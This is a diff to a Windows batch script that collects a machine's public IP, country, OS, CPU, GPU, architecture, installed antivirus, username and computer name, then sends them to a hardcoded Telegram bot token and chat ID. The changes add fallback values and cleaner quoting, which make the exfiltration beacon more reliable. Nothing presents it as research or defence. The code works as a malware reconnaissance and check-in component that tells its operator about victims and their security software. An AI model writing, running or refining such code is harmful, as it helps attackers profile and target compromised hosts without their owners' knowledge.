@@ -1,4 +1,5 @@
 setlocal EnableDelayedExpansion
+
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
 
@@ -6,14 +7,30 @@ for /f "delims=" %A in ('powershell -command "$json = Invoke-RestMethod -Uri htt
 for /f "tokens=1 delims=," %A in ("%IP_Country%") do set "IP=%A"
 for /f "tokens=2 delims=," %A in ("%IP_Country%") do set "Country=%A"
 
-for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do set Windows=%A
-for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_Processor).Name"') do set CPU=%A
-for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_VideoController).Caption"') do set GPU=%A
+for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do set "Windows=%A"
+for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_Processor).Name"') do set "CPU=%A"
+for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Class Win32_VideoController).Caption"') do set "GPU=%A"
 for /f "tokens=*" %A in ('powershell -command "[System.Environment]::Is64BitOperatingSystem"') do (if %A==True (set Arch=X64) else (set Arch=X86))
-for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (if defined Antivirus (set "Antivirus=!Antivirus!,%A") else (set "Antivirus=%A"))
+
+set "Antivirus=Not detected"
+for /f "tokens=*" %A in ('powershell -command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
+    if defined Antivirus (
+        set "Antivirus=!Antivirus!, %A"
+    ) else (
+        set "Antivirus=%A"
+    )
+)
+
+if not defined IP set "IP=Unknown"
+if not defined Country set "Country=Unknown"
+if not defined Windows set "Windows=Unknown"
+if not defined CPU set "CPU=Unknown"
+if not defined GPU set "GPU=Unknown"
 
 set UserName=%USERNAME%
 set Worker=%COMPUTERNAME%
 
-powershell -command "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%'; Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
+powershell -command ^
+"$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%'; ^
+Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
 endlocal
